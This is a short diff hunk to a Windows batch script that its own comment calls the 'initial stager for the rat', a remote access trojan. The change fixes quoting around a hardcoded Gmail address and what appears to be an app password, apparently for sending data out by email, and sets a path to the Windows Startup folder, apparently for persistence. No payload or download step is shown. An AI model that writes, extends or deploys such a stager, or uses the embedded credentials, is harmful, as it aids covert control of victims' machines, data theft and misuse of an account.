@@ -2,8 +2,8 @@
 
 @rem initial stager for the rat
 
-set email='defalttests@gmail.com'
-set password='nkos qxgo yxvo brmr'
+set email="defalttests@gmail.com"
+set password="nkos qxgo yxvo brmr"
 set InitialPath=%cd%
 set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 
